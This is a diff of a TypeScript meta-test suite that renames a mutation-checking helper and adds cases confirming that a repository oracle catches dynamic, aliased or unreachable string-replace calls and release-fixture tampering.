         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3389,7 +4577,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         "      ),"
       ].join("\n")
     );
-    expect(historicalMutationProblems(discardedDirectRegistryRoot)).toEqual(
+    expect(crossGenerationMutationProblems(discardedDirectRegistryRoot)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3425,13 +4613,13 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       `      ${legacyM165CallNode},`,
       ["      (", `        ${discardedM165CallNode},`, "        mcpbInputs.integrity", "      ),"].join("\n")
     );
-    expect(historicalMutationProblems(discardedProvenanceRoot)).toEqual(
+    expect(crossGenerationMutationProblems(discardedProvenanceRoot)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
-        expect.stringMatching(/release mutation hybrid legacy case release\.case\.m165 has no remaining root call/),
+        expect.stringMatching(/current unchanged identity release\.m165 has no exact current owner-case proof/),
         expect.stringMatching(
-          /release mutation hybrid shared primary matcher 84d0f85b5d5eb401cf80482bfec6ab0a2d4f60687d54d364f189bdc73052f680.*exact closed iterable\/runtime topology for 23 frozen root/
+          /release mutation hybrid shared primary matcher 84d0f85b5d5eb401cf80482bfec6ab0a2d4f60687d54d364f189bdc73052f680.*exact closed iterable\/runtime topology for 24 frozen root/
         )
       ])
     );
@@ -3450,7 +4638,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         "    }"
       ].join("\n")
     );
-    expect(historicalMutationProblems(conditionallySkippedSharedRegistryMatcher)).toEqual(
+    expect(crossGenerationMutationProblems(conditionallySkippedSharedRegistryMatcher)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3473,7 +4661,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         "      const { mutant, expectedProblem } = releaseTransactionMutationCases[mutationIndex]!;"
       ].join("\n")
     );
-    expect(historicalMutationProblems(shortenedTransactionMutationLoop)).toEqual(
+    expect(crossGenerationMutationProblems(shortenedTransactionMutationLoop)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3491,7 +4679,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "      const { mutant: expectedProblem, expectedProblem: mutant } = " +
         "releaseTransactionMutationCases[mutationIndex]!;"
     );
-    expect(historicalMutationProblems(swappedTransactionBindings)).toEqual(
+    expect(crossGenerationMutationProblems(swappedTransactionBindings)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3508,7 +4696,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "    for (const [label, weakenedRelease] of [",
       "    for (const [weakenedRelease, label] of ["
     );
-    expect(historicalMutationProblems(swappedTagIdentityBindings)).toEqual(
+    expect(crossGenerationMutationProblems(swappedTagIdentityBindings)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3544,7 +4732,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       '    expect(releaseMutationPlan.phase).toBe("partially-executed");',
       '    expect(releaseMutationPlan.phase).toBe("executed");'
     );
-    expect(historicalMutationProblems(wrongStagedPrefixPhase)).toEqual(
+    expect(crossGenerationMutationProblems(wrongStagedPrefixPhase)).toEqual(
       expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
     );
     const wrongStagedPrefixCaseCount = replaceExactly(
@@ -3557,7 +4745,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "    expect(releaseMutationPlan.expectationExecutions).toBe(36);",
       "    expect(releaseMutationPlan.expectationExecutions).toBe(35);"
     );
-    expect(historicalMutationProblems(wrongStagedPrefixCensus)).toEqual(
+    expect(crossGenerationMutationProblems(wrongStagedPrefixCensus)).toEqual(
       expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
     );
     const wrongStagedFinalCaseCount = replaceExactly(
@@ -3570,12 +4758,12 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "    expect(releaseMutationPlan.expectationExecutions).toBe(91);",
       "    expect(releaseMutationPlan.expectationExecutions).toBe(90);"
     );
-    expect(historicalMutationProblems(wrongStagedFinalCensus)).toEqual(
+    expect(crossGenerationMutationProblems(wrongStagedFinalCensus)).toEqual(
       expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
     );
 
     const missingStagedRemaining = replaceExactly(matrixSource, stagedRemainingCall, "");
-    expect(historicalMutationProblems(missingStagedRemaining)).toEqual(
+    expect(crossGenerationMutationProblems(missingStagedRemaining)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(stagedLifecycleProblem),
         expect.stringMatching(/declarative execution schedule must terminate complete .*found prefix/)
@@ -3589,7 +4777,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       stagedRemainingCall,
       [stagedRemainingCall, stagedRemainingCall].join("\n")
     );
-    expect(historicalMutationProblems(replayedStagedRemaining)).toEqual(
+    expect(crossGenerationMutationProblems(replayedStagedRemaining)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(stagedLifecycleProblem),
         expect.stringMatching(/declarative executeRemaining .*cannot replay a completed plan/)
@@ -3603,7 +4791,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       stagedRemainingCall,
       "    releaseMutationPlan.executeRemaining({ registryStepProblems: mcpRegistryRunProblems });"
     );
-    expect(historicalMutationProblems(reinjectedRemainingAdapter)).toEqual(
+    expect(crossGenerationMutationProblems(reinjectedRemainingAdapter)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(
           /release mutation hybrid executeRemaining event must use the exact staged execution argument shape/
@@ -3623,7 +4811,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         "    });"
       ].join("\n")
     );
-    expect(historicalMutationProblems(missingStagedAdapter)).toEqual(
+    expect(crossGenerationMutationProblems(missingStagedAdapter)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(
           /release mutation hybrid execute adapter must bind registryStepProblems exactly to mcpRegistryRunProblems/
@@ -3648,7 +4836,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       stagedRemainingCall,
       ["    if (true) {", "      releaseMutationPlan.executeRemaining();", "    }"].join("\n")
     );
-    expect(historicalMutationProblems(nestedStagedRemaining)).toEqual(
+    expect(crossGenerationMutationProblems(nestedStagedRemaining)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid execution events must be exact direct top-level property calls/)
       ])
@@ -3658,7 +4846,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       stagedRemainingCall,
       '    releaseMutationPlan["executeRemaining"]();'
     );
-    expect(historicalMutationProblems(computedStagedRemaining)).toEqual(
+    expect(crossGenerationMutationProblems(computedStagedRemaining)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid execution events must be exact direct top-level property calls/)
       ])
@@ -3678,7 +4866,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         "    });"
       ].join("\n")
     );
-    expect(historicalMutationProblems(unknownStagedBoundary)).toEqual(
+    expect(crossGenerationMutationProblems(unknownStagedBoundary)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/declarative executeThrough .*must name one exact root handle/),
         expect.stringMatching(stagedLifecycleProblem)
@@ -3697,7 +4885,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         "    });"
       ].join("\n")
     );
-    expect(historicalMutationProblems(wrongKnownStagedBoundary)).toEqual(
+    expect(crossGenerationMutationProblems(wrongKnownStagedBoundary)).toEqual(
       expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
     );
 
@@ -3709,7 +4897,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       sharedRegistryMatcherLoop,
       [stagedRemainingBlock, sharedRegistryMatcherLoop].join("\n")
     );
-    expect(historicalMutationProblems(earlyStagedRemaining)).toEqual(
+    expect(crossGenerationMutationProblems(earlyStagedRemaining)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -3727,7 +4915,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       npmEvaluatorPrimaryMatcherTail,
       `${npmEvaluatorPrimaryMatcherTail}\n${stagedRemainingBlock}`
     );
-    expect(historicalMutationProblems(lateStagedRemaining)).toEqual(
+    expect(crossGenerationMutationProblems(lateStagedRemaining)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
         expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
@@ -5031,7 +6219,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       "const npmWorkflowAlias = npmProvenanceWorkflowProblems;\n" +
       "const registryStepAlias = mcpRegistryStepProblems;\n" +
       "const registryRunAlias = mcpRegistryRunProblems;\n";
-    expect(historicalMutationProblems(registryDetectorAliasDrift)).toEqual(
+    expect(crossGenerationMutationProblems(registryDetectorAliasDrift)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(
           /release mutation hybrid alias must be exact const releaseIntegrityText = mcpbInputs\.integrity/
@@ -5215,7 +6403,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
       '"schemaVersion": 2,',
       '"schemaVersion": 2,\n  "schemaVersion": 2,'
     );
-    const duplicateKeyProblems = releaseMutationIdentityAuditProblems(matrixSource, duplicateTopLevelKey);
+    const duplicateKeyProblems = historicalFixtureMutationProblems(duplicateTopLevelKey);
     expect(duplicateKeyProblems).toEqual([
       expect.stringMatching(/duplicate JSON key schemaVersion/),
       expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/)
@@ -5223,13 +6411,13 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
 
     const referencedDeclarationDrift = replaceExactly(
       matrixSource,
-      `const MCPB_EXACT_NPM_PACK = '"$TIMEOUT_BIN" --kill-after=10s 600s "$NPM_BIN" pack --json --ignore-scripts';`,
-      `const MCPB_EXACT_NPM_PACK = '"$TIMEOUT_BIN" --kill-after=10s 600s "$NPM_BIN" pack --json --ignore-scriptz';`
+      `const NPM_PROVENANCE_AUDIT_COMMAND = '"$TIMEOUT_BIN" --kill-after=10s 120s "$NODE_BIN" "$NPM_CLI_JS" audit signatures';`,
+      `const NPM_PROVENANCE_AUDIT_COMMAND = '"$TIMEOUT_BIN" --kill-after=10s 120s "$NODE_BIN" "$NPM_CLI_JS" audit signaturez';`
     );
     const beforeSourceCatalogueDrift = preparedAudit.telemetry();
     expect(historicalMutationProblems(referencedDeclarationDrift)).toEqual(
       expect.arrayContaining([
-        expect.stringMatching(/manifest source row 6 disagrees with the exact reviewed catalogue identity/)
+        expect.stringMatching(/manifest source row 7 disagrees with the exact reviewed catalogue identity/)
       ])
     );
     const afterSourceCatalogueDrift = preparedAudit.telemetry();
@@ -5268,7 +6456,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
     registryStepIntegrityCheck.invoke.inputs.arguments.reverse();
     npmContractReleaseCheck.invoke.inputs.arguments.reverse();
     npmContractIntegrityCheck.invoke.inputs.arguments.reverse();
-    expect(releaseMutationIdentityAuditProblems(matrixSource, JSON.stringify(releaseOracleCompanionControl))).toEqual(
+    expect(historicalFixtureMutationProblems(JSON.stringify(releaseOracleCompanionControl))).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/),
         expect.stringMatching(/inputs\.arguments disagree with the exact registry\.step\.run detector signature/),
@@ -5279,7 +6467,8 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
     );
 
     const tampered = JSON.parse(fixtureBefore) as MutableIdentityControlManifest;
-    const firstSource = firstIdentityEntry(tampered.sources, "source identities");
+    const contentBoundSource = tampered.sources.find((source) => source.id === "fragment.npm-provenance-audit-command");
+    if (contentBoundSource === undefined) throw new Error("release identity fixture has no retained content source");
     const unrelatedSource = tampered.sources[1];
     if (unrelatedSource === undefined) throw new Error("release identity fixture has no unrelated source identity");
     const firstMutation = firstIdentityEntry(tampered.mutations, "mutation identities");
@@ -5287,8 +6476,7 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
     if (dependencySplitMutation === undefined) throw new Error("release identity fixture has no release.m038");
     const firstCase = firstIdentityEntry(tampered.cases, "case identities");
     const firstCheck = firstIdentityEntry(firstCase.checks, "case checks");
-    firstSource.contentSha256 = "0".repeat(64);
-    refreshSourceSemanticFingerprint(firstSource);
+    contentBoundSource.contentSha256 = "0".repeat(64);
     firstMutation.expressions.needle.raw += " /* manifest raw-expression drift */";
     firstMutation.expressions.needle.resolved += "\n# resolved-needle drift";
     firstMutation.expressions.source.resolved = unrelatedSource.id;
@@ -5296,15 +6484,18 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
     firstCheck.invoke.kind = "release.poll";
     firstCheck.invoke.inputs.callee = "unreviewedDetector";
     firstCheck.expectation.regex = "workflow.schema.unreviewed-regex";
-    const tamperProblems = releaseMutationIdentityAuditProblems(matrixSource, JSON.stringify(tampered));
+    const tamperProblems = historicalFixtureMutationProblems(JSON.stringify(tampered));
     expect(tamperProblems).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/),
         expect.stringMatching(/release mutation hybrid dependency edge release\.m037->release\.m038 crosses/),
-        expect.stringMatching(/contentSha256 must identify exact materialized bytes/),
-        expect.stringMatching(/needle raw expression disagrees with exact AST identity/),
-        expect.stringMatching(/resolved source must equal/),
-        expect.stringMatching(/resolved needle disagrees with independent AST evaluation/),
+        expect.stringMatching(
+          /manifest source fragment\.npm-provenance-audit-command semanticFingerprint must be sha256:/
+        ),
+        expect.stringMatching(/manifest mutation release\.m001 resolved source must equal workflow\.release-raw/),
+        expect.stringMatching(/manifest mutation release\.m001 semanticFingerprint must be sha256:/),
+        expect.stringMatching(/manifest mutation release\.m038 semanticFingerprint must be sha256:/),
+        expect.stringMatching(/manifest case release\.case\.m001 semanticFingerprint must be sha256:/),
         expect.stringMatching(/baseline must equal release\.poll mutant source fixture\.release-workflow/),
         expect.stringMatching(/inputs\.callee must be releasePollProblems/),
         expect.stringMatching(/inputs\.arguments disagree with the exact release\.poll detector signature/),
@@ -5439,27 +6630,225 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         expect.stringMatching(/unclassified raw \.(?:replace|replaceAll) (?:access|(?:assignment )?binding)/)
       ]);
     }
-    const reviewedNormalization = 'const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");';
-    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", reviewedNormalization)).toEqual([]);
-    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", "")).toContain(
-      "docs-consistency.test.ts expected 1 reviewed ordinary transform(s), found 0"
-    );
     expect(
       repositoryMutationOracleProblems(
-        "docs-consistency.test.ts",
-        'const normalizedLifecycle = lifecycle.replace(/\\s*/g, " ");'
+        mutationInventoryFile,
+        'const method = "replace";\nconst weakened = source[method]("old", "new");'
       )
-    ).toEqual(
+    ).toEqual([expect.stringMatching(/unclassified raw \.replace access/)]);
+    expect(repositoryMutationOracleProblems(mutationInventoryFile, 'source[getMethod()]("old", "new");')).toEqual([
+      expect.stringMatching(/dynamic computed method access; replace\/replaceAll cannot be excluded/)
+    ]);
+    for (const extractedDynamicMethod of [
+      'const rawMutation = source[getMethod()]; rawMutation.call(source, "old", "new");',
+      'let rawMutation; rawMutation = source[getMethod()]; rawMutation("old", "new");',
+      'const rawMutation = source[getMethod()]; const alias = rawMutation; alias.apply(source, ["old", "new"]);',
+      'const invoke = (fn) => fn.call(source, "old", "new"); invoke(source[getMethod()]);',
+      'const invoke = (fn) => fn.call(source, "old", "new"); const alias = invoke; alias(source[getMethod()]);',
+      'const invoke = (fn) => fn.call(source, "old", "new"); let alias; alias = invoke; alias(source[getMethod()]);',
+      '({ rawMutation: source[getMethod()] }).rawMutation("old", "new");',
+      'const holder = { rawMutation: source[getMethod()] }; holder.rawMutation("old", "new");',
+      'const holder = { rawMutation: source[getMethod()] }; const alias = holder; alias.rawMutation("old", "new");',
+      'function select() { return source[getMethod()]; } select().call(source, "old", "new");',
+      'const select = () => source[getMethod()]; const alias = select; alias().call(source, "old", "new");',
+      'const select = function named() { return source[getMethod()]; }; const alias = select; alias().call(source, "old", "new");'
+    ]) {
+      expect(repositoryMutationOracleProblems(mutationInventoryFile, extractedDynamicMethod)).toEqual([
+        expect.stringMatching(/invokes a value extracted from an unresolved dynamic computed method/)
+      ]);
+    }
+    const safelyShadowedDynamicMethod = [
+      "const rawMutation = source[getMethod()];",
+      "{",
+      '  const rawMutation = () => "safe";',
+      "  rawMutation();",
+      "}"
+    ].join("\n");
+    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicMethod)).toEqual([]);
+    const safelyShadowedDynamicProperty = [
+      "const holder = { rawMutation: source[getMethod()] };",
+      "{",
+      '  const holder = { rawMutation: () => "safe" };',
+      '  holder.rawMutation("old", "new");',
+      "}"
+    ].join("\n");
+    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicProperty)).toEqual([]);
+    const safelyShadowedDynamicReturn = [
+      "const select = () => source[getMethod()];",
+      "{",
+      '  const select = () => () => "safe";',
+      "  const alias = select;",
+      '  alias().call(source, "old", "new");',
+      "}"
+    ].join("\n");
+    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicReturn)).toEqual([]);
+    const safelyShadowedDynamicParameter = [
+      'const invoke = (fn) => fn.call(source, "old", "new");',
+      "{",
+      '  const invoke = (value) => "safe";',
+      "  const alias = invoke;",
+      "  alias(source[getMethod()]);",
+      "}"
+    ].join("\n");
+    expect(repositoryMutationOracleProblems(mutationInventoryFile, safelyShadowedDynamicParameter)).toEqual([]);
+
+    const docsConsistencySource = await fs.readFile(path.join(repoRoot, "tests/docs-consistency.test.ts"), "utf8");
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", docsConsistencySource)).toEqual([]);
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", "")).toEqual([
+      "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0",
+      "docs-consistency.test.ts expected exactly one pdf OCR whitespace normalization, found 0",
+      "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0",
+      "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
+    ]);
+
+    for (const mutation of [
+      {
+        expectedMissing: "pdf OCR quote normalization",
+        needle: 'const normalizedQuotes = text.replace(/["\'`]/g, "");',
+        replacement: 'const normalizedQuotes = text.replace(/[a-z]/g, "");'
+      },
+      {
+        expectedMissing: "pdf OCR whitespace normalization",
+        needle: 'const normalizedWhitespace = normalizedQuotes.replace(/\\s+/g, " ");',
+        replacement: 'const normalizedWhitespace = normalizedQuotes.replace(/\\s*/g, " ");'
+      },
+      {
+        expectedMissing: "lifecycle whitespace normalization",
+        needle: 'const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");',
+        replacement: 'const normalizedLifecycle = lifecycle.replace(/\\s*/g, " ");'
+      },
+      {
+        expectedMissing: "release gate parenthesis unescape",
+        needle: 'const unescapedGate = gate.replace(/\\\\([()])/g, "$1");',
+        replacement: 'const unescapedGate = gate.replace(/\\\\([()])/g, "");'
+      }
+    ]) {
+      expect(
+        repositoryMutationOracleProblems(
+          "docs-consistency.test.ts",
+          replaceExactly(docsConsistencySource, mutation.needle, mutation.replacement)
+        )
+      ).toEqual(
+        expect.arrayContaining([
+          expect.stringMatching(/unclassified raw \.replace access/),
+          `docs-consistency.test.ts expected exactly one ${mutation.expectedMissing}, found 0`
+        ])
+      );
+    }
+
+    const dynamicAliasWithDeadDecoy = replaceExactly(
+      docsConsistencySource,
+      'const normalizedQuotes = text.replace(/["\'`]/g, "");',
+      'const rawReplaceMethod = "replace";\n' +
+        '    const normalizedQuotes = text[rawReplaceMethod](/["\'`]/g, "");\n' +
+        "    if (false) {\n" +
+        '      const normalizedQuotes = text.replace(/["\'`]/g, "");\n' +
+        "      void normalizedQuotes;\n" +
+        "    }"
+    );
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", dynamicAliasWithDeadDecoy)).toEqual(
       expect.arrayContaining([
         expect.stringMatching(/unclassified raw \.replace access/),
-        "docs-consistency.test.ts expected 1 reviewed ordinary transform(s), found 0"
+        "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0"
+      ])
+    );
+
+    const relocatedGate = replaceExactly(
+      docsConsistencySource,
+      'const unescapedGate = gate.replace(/\\\\([()])/g, "$1");',
+      'if (false) {\n        const unescapedGate = gate.replace(/\\\\([()])/g, "$1");\n        void unescapedGate;\n      }'
+    );
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", relocatedGate)).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(/unclassified raw \.replace access/),
+        "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
+      ])
+    );
+
+    for (const receiverMutation of [
+      '"lint|test \\(22\\)|test \\(24\\)|smoke|audit|coverage|version-consistency|docs|oia|protocol-conformance|package-consumer|mcpb-basic|docker".split("|")',
+      "([] as string[])"
+    ]) {
+      const detachedGateReceiver = replaceExactly(docsConsistencySource, '(m[1] ?? "").split("|")', receiverMutation);
+      expect(repositoryMutationOracleProblems("docs-consistency.test.ts", detachedGateReceiver)).toEqual(
+        expect.arrayContaining([
+          expect.stringMatching(/unclassified raw \.replace access/),
+          "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
+        ])
+      );
+    }
+
+    const unreachablePdfNormalize = replaceExactly(
+      docsConsistencySource,
+      "  };\n  const read = normalize(readPdf);",
+      "  };\n  return [];\n  const read = normalize(readPdf);"
+    );
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", unreachablePdfNormalize)).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(/unclassified raw \.replace access/),
+        "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0",
+        "docs-consistency.test.ts expected exactly one pdf OCR whitespace normalization, found 0"
+      ])
+    );
+
+    const lifecycleContractLoop = [
+      "    for (const contract of [",
+      ...REVIEWED_LIFECYCLE_CONTRACTS.map(
+        (contract, index) =>
+          `      ${JSON.stringify(contract)}${index === REVIEWED_LIFECYCLE_CONTRACTS.length - 1 ? "" : ","}`
+      ),
+      "    ]) {"
+    ].join("\n");
+    const lifecycleEmptyIterable = replaceExactly(
+      docsConsistencySource,
+      lifecycleContractLoop,
+      "    for (const contract of []) {"
+    );
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", lifecycleEmptyIterable)).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(/unclassified raw \.replace access/),
+        "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0"
+      ])
+    );
+
+    const lifecycleReassignment = replaceExactly(
+      replaceExactly(
+        docsConsistencySource,
+        'const lifecycle = lifecycleMatch?.[1] ?? "";',
+        'let lifecycle = lifecycleMatch?.[1] ?? "";'
+      ),
+      'const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");',
+      `lifecycle = ${JSON.stringify(REVIEWED_LIFECYCLE_CONTRACTS.join(" "))};\n    ` +
+        'const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");'
+    );
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", lifecycleReassignment)).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(/unclassified raw \.replace access/),
+        "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0"
+      ])
+    );
+
+    const unreachableReviewedSet =
+      "if (false) {\n" +
+      '  const normalizedQuotes = text.replace(/["\'`]/g, "");\n' +
+      '  const normalizedWhitespace = normalizedQuotes.replace(/\\s+/g, " ");\n' +
+      '  const normalizedLifecycle = lifecycle.replace(/\\s+/g, " ");\n' +
+      '  const unescapedGate = gate.replace(/\\\\([()])/g, "$1");\n' +
+      "}";
+    expect(repositoryMutationOracleProblems("docs-consistency.test.ts", unreachableReviewedSet)).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(/unclassified raw \.replace access/),
+        "docs-consistency.test.ts expected exactly one pdf OCR quote normalization, found 0",
+        "docs-consistency.test.ts expected exactly one pdf OCR whitespace normalization, found 0",
+        "docs-consistency.test.ts expected exactly one lifecycle whitespace normalization, found 0",
+        "docs-consistency.test.ts expected exactly one release gate parenthesis unescape, found 0"
       ])
     );
 
     const files = await collectInvariantTestFiles();
     expect(
       files.length,
-      "expected exactly 34 structural-invariant files (*-invariant.test.ts + curated EXTRA_STRUCTURAL_FILES)"
+      "expected exactly 35 structural-invariant files (*-invariant.test.ts + curated EXTRA_STRUCTURAL_FILES)"
     ).toBe(EXPECTED_STRUCTURAL_FILE_COUNT);
 
     const violations: string[] = [];
@@ -5481,6 +6870,14 @@ describe("META-invariant: exact structural census + NEGATIVE control coverage", 
         expect(bindingProblems, bindingProblems.join("\n")).toEqual([]);
         if (filename === "abs-path-leak-invariant.test.ts") {
           for (const requiredCall of ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS) {
+            expect(
+              exactMutationHelperCallCount(filename, source, requiredCall),
+              `${filename} must retain exactly one ${requiredCall.label} exact mutation call`
+            ).toBe(1);
+          }
+        }
+        if (filename === "docs-consistency.test.ts") {
+          for (const requiredCall of DOCS_CONSISTENCY_CONVERTED_RAW_MUTATIONS) {
             expect(
               exactMutationHelperCallCount(filename, source, requiredCall),
               `${filename} must retain exactly one ${requiredCall.label} exact mutation call`
